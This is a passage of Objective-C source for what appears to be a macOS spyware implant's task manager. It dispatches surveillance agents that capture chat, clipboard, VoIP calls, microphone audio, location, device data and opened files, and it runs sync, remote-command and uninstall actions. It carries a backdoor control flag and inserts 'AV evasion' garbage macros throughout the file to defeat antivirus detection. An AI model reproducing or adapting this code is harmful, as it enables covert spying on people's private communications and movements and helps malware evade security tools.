            case AGENT_CHAT_NEW:
              {         
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                
                  ///// agent chat as history dump starts here
                  __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
                  agentConfiguration = [[anObject objectForKey: @"data"] retain];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  [anObject setObject: AGENT_START
                               forKey: @"status"];
                  [agentChat setAgentConfiguration: anObject];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_004
                  
                  [NSThread detachNewThreadSelector: @selector(start)
                                           toTarget: agentChat
                                         withObject: nil];
                  ///// agent chat as history dump ends here

                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                BOOL success = [_logManager createLog: AGENT_CHAT_NEW
                                          agentHeader: nil
                                            withLogID: 0];
                    
                if (success == TRUE)
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                  
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_IM
                                            fromComponent: COMP_CORE] == TRUE)
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent CHAT");
#endif
                        [anObject setObject: AGENT_RUNNING forKey: @"status"];
                      }
                  }
                
                break;
              }
            case AGENT_CLIPBOARD:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_002
                
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;         
                
                // AV evasion: only on release build
                AV_GARBAGE_007
    
                BOOL success = [_logManager createLog: AGENT_CLIPBOARD
                                          agentHeader: nil
                                            withLogID: 0];
                    
                if (success == TRUE)
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                  
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_CLIPBOARD
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        [anObject setObject: AGENT_RUNNING forKey: @"status"];
                        
                        // AV evasion: only on release build
                        AV_GARBAGE_002
                        
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Error while sending start command to the agent");
#endif
                      }
                  }
                
                break;
              } 
            case AGENT_VOIP:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration  = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                {         
                  // AV evasion: only on release build
                  AV_GARBAGE_002
                  
                  break;
                  }
                else
                  {
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID         = AGENT_VOIP;
                    shMemoryHeader->direction       = D_TO_AGENT;
                    shMemoryHeader->command         = AG_START;
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    NSMutableData *voipConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                    
                    shMemoryLog *_voipConfig     = (shMemoryLog *)[voipConfig bytes];
                    _voipConfig->status          = SHMEM_WRITTEN;
                    _voipConfig->agentID         = AGENT_VOIP;
                    _voipConfig->direction       = D_TO_AGENT;
                    _voipConfig->commandType     = CM_AGENT_CONF;
                    _voipConfig->commandDataSize = [agentConfiguration length];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                    
                    memcpy(_voipConfig->commandData,
                           [agentConfiguration bytes],
                           [agentConfiguration length]);
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_005
                    
                    if ([gSharedMemoryLogging writeMemory: voipConfig
                                                   offset: 0
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        if ([gSharedMemoryCommand writeMemory: agentCommand
                                                       offset: OFFT_VOIP
                                                fromComponent: COMP_CORE] == TRUE)
                        {         
                          // AV evasion: only on release build
                          AV_GARBAGE_000
                          
                          [anObject setObject: AGENT_RUNNING forKey: @"status"];
                          }
                      }
                  }
                
                break;
              }
            case AGENT_POSITION:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
                agentConfiguration = [[self getConfigForAgent: agentID] retain];
                
                // AV evasion: only on release build
                AV_GARBAGE_002
                
                if (agentConfiguration != nil)
                  {
                    if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                        && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                      {         
                        // AV evasion: only on release build
                        AV_GARBAGE_007
                      
                        [agentConfiguration setObject: AGENT_START forKey: @"status"];
                        [agentPosition setAgentConfiguration: agentConfiguration];
                        
                        // AV evasion: only on release build
                        AV_GARBAGE_006
                        
                        [NSThread detachNewThreadSelector: @selector(start)
                                                 toTarget: agentPosition
                                               withObject: nil];
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Agent Position is already running");
#endif
                      }
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent not found");
#endif

                    return FALSE;
                  }
                break;
              }
            case AGENT_DEVICE:
              {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Starting Agent Device");
#endif

                // AV evasion: only on release build
                AV_GARBAGE_002
                
                __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
                agentConfiguration = [[self getConfigForAgent: agentID] retain];

                if (agentConfiguration != nil)
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_001
                  
                    if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                     && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                      {         
                        // AV evasion: only on release build
                        AV_GARBAGE_003
                      
                        [agentConfiguration setObject: AGENT_START forKey: @"status"];
                        [agentDevice setAgentConfiguration: agentConfiguration];

                        [NSThread detachNewThreadSelector: @selector(start)
                                                 toTarget: agentDevice
                                               withObject: nil];
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Agent Device is already running");
#endif
                      }
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    errorLog(@"Agent not found");
#endif
                    return FALSE;
                  }
                break;
              }
            case AGENT_MICROPHONE:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_002
                  
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START
                                 forKey: @"status"];
                    [agentMic setAgentConfiguration: anObject];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_005
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMic
                                           withObject: nil];
                  }
                                
                break;
              }
            case AGENT_FILECAPTURE_OPEN:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration  = [[anObject objectForKey: @"data"] retain];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_001
                  
                    break;
                  }
                else
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_002
                    
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
                    shMemoryHeader->direction       = D_TO_AGENT;
                    shMemoryHeader->command         = AG_START;
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_009
                    
                    BOOL success = [_logManager createLog: AGENT_FILECAPTURE_OPEN
                                              agentHeader: nil
                                                withLogID: 0];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_006
                    
                    if (success)
                      {         
                        // AV evasion: only on release build
                        AV_GARBAGE_003
                      
                        NSMutableData *fileConfig = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
                        
                        // AV evasion: only on release build
                        AV_GARBAGE_002
                        
                        shMemoryLog *_fileConfig     = (shMemoryLog *)[fileConfig bytes];
                        _fileConfig->status          = SHMEM_WRITTEN;
                        _fileConfig->agentID         = AGENT_INTERNAL_FILECAPTURE;
                        _fileConfig->direction       = D_TO_AGENT;
                        _fileConfig->commandType     = CM_AGENT_CONF;
                        _fileConfig->commandDataSize = [agentConfiguration length];

                        // AV evasion: only on release build
                        AV_GARBAGE_001
                        
                        memcpy(_fileConfig->commandData,
                               [agentConfiguration bytes],
                               [agentConfiguration length]);
                        
                        // AV evasion: only on release build
                        AV_GARBAGE_008
                        
                        if ([gSharedMemoryLogging writeMemory: fileConfig
                                                       offset: 0
                                                fromComponent: COMP_CORE] == TRUE)
                          {         
                            // AV evasion: only on release build
                            AV_GARBAGE_003
                          
                            if ([gSharedMemoryCommand writeMemory: agentCommand
                                                           offset: OFFT_FILECAPTURE
                                                    fromComponent: COMP_CORE] == TRUE)
                              {         
                                // AV evasion: only on release build
                                AV_GARBAGE_007
                                [anObject setObject: AGENT_RUNNING
                                             forKey: @"status"];
                              }
                          }

                        [agentConfiguration release];
                        [fileConfig release];
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        errorLog(@"Error while initializing empty log for file capture");
#endif
                      }
                  }
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                break;
              
              }
            case AGENT_CRISIS:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                gAgentCrisis |= CRISIS_START;                
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                [infoManager logActionWithDescription: @"Crisis starting"];
                [infoManager release];
                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                // Only for input manager
                if ([gUtil isLeopard])
                  {
                    if (gAgentCrisisApp == nil)
                      break;
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_000
                    
                    agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                    agentConfiguration = [[self getConfigForAgent: agentID] retain];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_009
                    
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    shMemoryHeader->agentID = agentID;          
                    shMemoryHeader->direction = D_TO_AGENT;
                    shMemoryHeader->command = AG_START;
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_008
                    
                    memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    NSMutableData *tmpArray = [[NSMutableData alloc] initWithCapacity: 0];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_006
                    
                    UInt32 tmpNum = [gAgentCrisisApp count];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_005
                    
                    int tmpLen = sizeof(shMemoryHeader->commandData);

                    unichar padZero=0;
                    NSData *tmpPadData = [[NSData alloc] initWithBytes: &padZero length:sizeof(unichar)];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                    
                    [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                    
                    tmpLen -= sizeof(UInt32);

                    for (int i=0; i < [gAgentCrisisApp count]; i++)
                      {         
                        // AV evasion: only on release build
                        AV_GARBAGE_002
                      
                        NSString *tmpString = (NSString*)[gAgentCrisisApp objectAtIndex: i];
                        
                        // AV evasion: only on release build
                        AV_GARBAGE_002
                        
                        tmpLen -= [tmpString lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + sizeof(unichar);

                        if (tmpLen > 0)
                          {         
                            // AV evasion: only on release build
                            AV_GARBAGE_007
                          
                            [tmpArray appendData: [tmpString dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
                            [tmpArray appendData: tmpPadData];
                          }
                      }
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_008
                    
                    [tmpPadData release];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_009
                    
                    shMemoryHeader->commandDataSize = [tmpArray length];
                    memcpy(shMemoryHeader->commandData, [tmpArray bytes], shMemoryHeader->commandDataSize);
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_006
                    
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_CRISIS
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        [agentConfiguration setObject: AGENT_RUNNING
                                               forKey: @"status"];    
                        
                        // AV evasion: only on release build
                        AV_GARBAGE_003
                      }
                    else
                      {         
                        // AV evasion: only on release build
                        AV_GARBAGE_008
                      
                        [tmpArray release];
                        [agentCommand release];
                        [agentConfiguration release];
                        return NO;
                      }

                    [tmpArray release];
                  }
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                break;
              }
            default:
              break;
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          if (agentConfiguration != nil)
            [agentConfiguration release];
        }
      
      [status release];
      [innerPool release];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return YES;
}

#pragma mark -
#pragma mark Monitors
#pragma mark -

- (void)eventsMonitor
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSEnumerator *enumerator = [mEventsList objectEnumerator];
  id anObject;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  while ((anObject = [enumerator nextObject]) != nil)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      u_int eventType = [[anObject threadSafeObjectForKey: @"type"
                                                usingLock: gTaskManagerLock] intValue];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      switch (eventType)
        {
        case EVENT_TIMER:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            __m_MEvents *events = [__m_MEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventTimer:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_PROCESS:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_005
            
            __m_MEvents *events = [__m_MEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventProcess:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_CONNECTION:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            __m_MEvents *events = [__m_MEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventConnection:)
                                     toTarget: events
                                   withObject: anObject];
            break; 
          }
        case EVENT_SCREENSAVER:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            __m_MEvents *events = [__m_MEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventScreensaver:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_SYSLOG:
          break;
        case EVENT_QUOTA:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            __m_MEvents *events = [__m_MEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventQuota:)
                                     toTarget: events
                                   withObject: anObject];
          }
          break;
        case EVENT_IDLE:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            __m_MEvents *events = [__m_MEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventIdle:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        default:
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
          break;
        }
      
      [innerPool release];
    }
  
  [outerPool release];
}

- (BOOL)stopEvents
{
  NSMutableDictionary *anObject;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  int counter   = 0;
  int errorFlag = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  int i = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  for (; i < [mEventsList count]; i++)
    {
      anObject = [mEventsList objectAtIndex: i];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [anObject setValue: EVENT_STOP
                  forKey: @"status"];
      
      while (![[anObject objectForKey: @"status"] isEqualToString: EVENT_STOPPED]
             && counter <= MAX_STOP_WAIT_TIME)
        {
          usleep(100000);
          counter++;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      if (counter == MAX_STOP_WAIT_TIME)
        errorFlag = 1;
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      counter = 0;
    }
  
  if (errorFlag == 0)
    return TRUE;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return FALSE;
}

#pragma mark -
#pragma mark Action Dispatcher
#pragma mark -

- (BOOL)triggerAction: (int)anActionID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  BOOL _isSyncing = NO;
  int waitCounter = 0;
  NSMutableDictionary *configuration;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSArray *configArray = [self getConfigForAction: anActionID];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (configArray == nil)
    {        
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      [outerPool release];
      return FALSE;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  for (configuration in configArray)
    {         
      // AV evasion: only on release build
      AV_GARBAGE_007
        
      u_int actionType = [[configuration objectForKey: @"type"] intValue];

      switch (actionType)
        {
        case ACTION_SYNC:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_000
            
            if ((gAgentCrisis & CRISIS_START) && (gAgentCrisis & CRISIS_SYNC))
              {
                break;
              }  
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            [gSyncLock lock];
            _isSyncing = mIsSyncing;
            [gSyncLock unlock];
            
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            if (_isSyncing == YES)
              {
                while (_isSyncing == YES && waitCounter < MAX_ACTION_WAIT_TIME)
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    [gSyncLock lock];
                    _isSyncing = mIsSyncing;
                    [gSyncLock unlock];

                    sleep(1);
                    waitCounter++;
                  }
                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                // We've waited way too much here
                if (waitCounter == MAX_ACTION_WAIT_TIME)
                  {
                    return FALSE;
                  }
              }
            
            // AV evasion: only on release build
            AV_GARBAGE_009
            
            [gSyncLock lock];
            mIsSyncing = YES;
            [gSyncLock unlock];
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            NSNumber *status = [NSNumber numberWithInt: ACTION_PERFORMING];
            
            [configuration threadSafeSetObject: status
                                        forKey: @"status"
                                     usingLock: gSyncLock];
            
            // AV evasion: only on release build
            AV_GARBAGE_005
            
            BOOL stop = [[configuration objectForKey:@"stop"] boolValue];
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            BOOL bSyncRet = [mActions actionSync: configuration];
            
            [gSyncLock lock];
            mIsSyncing = NO;
            [gSyncLock unlock];
            
            if (bSyncRet == YES && stop == TRUE)
              {         
                // AV evasion: only on release build
                AV_GARBAGE_001
              
                [outerPool release];
                return TRUE;
              }
               
            break;
          }
        case ACTION_AGENT_START:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {         
                // AV evasion: only on release build
                AV_GARBAGE_003
              
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];
                
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [mActions actionAgent: configuration start: TRUE];
              }
            break;
          }
        case ACTION_AGENT_STOP:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {         
                // AV evasion: only on release build
                AV_GARBAGE_004
              
                NSNumber *status = [NSNumber numberWithInt: 1];
                
                [configuration threadSafeSetObject: status
                                            forKey: @"status"
                                         usingLock: gTaskManagerLock];
                
                // AV evasion: only on release build
                AV_GARBAGE_005
                
                [mActions actionAgent: configuration start: FALSE];
              }

            break;
          }
        case ACTION_EXECUTE:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {          
                // AV evasion: only on release build
                AV_GARBAGE_003
              
                NSNumber *status = [NSNumber numberWithInt: 1];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                [configuration threadSafeSetObject: status
                                            forKey: @"status"
                                         usingLock: gTaskManagerLock];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                [mActions actionLaunchCommand: configuration];
              }

            break;
          }
        case ACTION_UNINSTALL:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_005
            
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                [configuration threadSafeSetObject: status
                                            forKey: @"status"
                                         usingLock: gTaskManagerLock];
                
                // AV evasion: only on release build
                AV_GARBAGE_002
                
                [mActions actionUninstall: configuration];
              }
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            break;
          }
        case ACTION_INFO:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
                
                [mActions actionInfo: configuration];
                status = [NSNumber numberWithInt: 0];
                [configuration setObject: status forKey: @"status"];
              }
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            break;
          }
        case ACTION_EVENT:
          {         
            // AV evasion: only on release build
            AV_GARBAGE_006
            
          if ([[configuration objectForKey: @"status"] intValue] == 0)
            {
              NSNumber *status = [NSNumber numberWithInt: 1];
              [configuration setObject: status forKey: @"status"];
              
              // AV evasion: only on release build
              AV_GARBAGE_008
              
              [mActions actionEvent: configuration];
              status = [NSNumber numberWithInt: 0];   
              
              // AV evasion: only on release build
              AV_GARBAGE_009
              
              [configuration setObject: status forKey: @"status"];
            }
          
          break;
          }
        default:
          break;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return TRUE;
}

#pragma mark -
#pragma mark Registering functions for events/actions/agents
#pragma mark -

- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status
{         
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSMutableDictionary *agentConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSNumber *tempID      = [NSNumber numberWithUnsignedInt: agentID];
  NSString *agentState  = (status == 1) ? AGENT_ENABLED : AGENT_DISABLED;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                   @"status",
                   @"data",
                   nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSArray *objects;
  
  if (agentData == nil)
  {
    objects = [NSArray arrayWithObjects: tempID,
               agentState,
               @"",
               nil];
  }
  else
  {
    objects = [NSArray arrayWithObjects: tempID,
               agentState,
               agentData,
               nil];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [agentConfiguration addEntriesFromDictionary: dictionary];
  [mAgentsList addObject: agentConfiguration];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return YES;  
}

- (BOOL)unregisterAgent: (u_int)agentID
{         
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return YES;
}

- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID
{         
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSMutableDictionary *actionConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
 
  NSNumber *action  = [NSNumber numberWithUnsignedInt: actionID];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: actionType];
  NSNumber *status  = [NSNumber numberWithInt: 0];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSArray *keys     = [NSArray arrayWithObjects: @"actionID",
                                                 @"type",
                                                 @"data",
                                                 @"status",
                                                 nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSArray *objects;
  
  if (actionData == nil)
    {
      objects = [NSArray arrayWithObjects: action,
                                           type,
                                           @"",
                                           status,
                                           nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: action,
                                           type,
                                           actionData,
                                           status,
                                           nil];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [actionConfiguration addEntriesFromDictionary: dictionary];
  [mActionsList addObject: actionConfiguration];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return YES;
}

- (BOOL)unregisterAction: (u_int)actionID
{         
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return YES;
}

- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID
{         
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSMutableDictionary *eventConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: aType];
  NSNumber *action  = [NSNumber numberWithUnsignedInt: actionID];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSArray *keys = [NSArray arrayWithObjects: @"type",
                   @"actionID",
                   @"data",
                   @"status",
                   @"monitor",
                   nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSArray *objects;
  
  if (eventData == nil)
  {
    objects = [NSArray arrayWithObjects: type,
               action,
               @"",
               EVENT_START,
               @"",
               nil];
  }
  else
  {
    objects = [NSArray arrayWithObjects: type,
               action,
               eventData,
               EVENT_START,
               @"",
               nil];
  }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [mEventsList addObject: eventConfiguration];
  
  return YES;
}

- (BOOL)unregisterEvent: (u_int)eventID
{         
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSArray *)agentsList
{         
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return mAgentsList;
}

- (NSArray *)actionsList
{
  return mActionsList;
}
- (NSArray *)eventsList
{
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return mEventsList;
}

- (void)removeAllElements
{
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Cleaning all internal conf objects");
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [mEventsList  removeAllObjects];
  [mActionsList removeAllObjects];
  [mAgentsList  removeAllObjects];
}

- (NSArray *)getConfigForAction: (u_int)anActionID
{
#define ACTION_SUBACT_KEY @"subactions"  
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (anActionID == 0xFFFFFFFF)
    return nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSArray *subactions;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  @synchronized(self)
  {
    NSDictionary *subaction = [mActionsList objectAtIndex:anActionID];
    subactions = [[[subaction objectForKey: ACTION_SUBACT_KEY] retain] autorelease];
  }
  
  return subactions;
}

- (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
{         
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSMutableDictionary *anObject;
  int i = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  for (; i < [mAgentsList count]; i++)
    {         
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      anObject = [mAgentsList objectAtIndex: i];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      if ([[anObject threadSafeObjectForKey: @"agentID"
                                  usingLock: gTaskManagerLock]
           unsignedIntValue] == anAgentID)
        {         
          // AV evasion: only on release build
          AV_GARBAGE_000
        
          return anObject;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return nil;
}

- (NSString *)getControlFlag
{         
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  return mBackdoorControlFlag;
}

@end
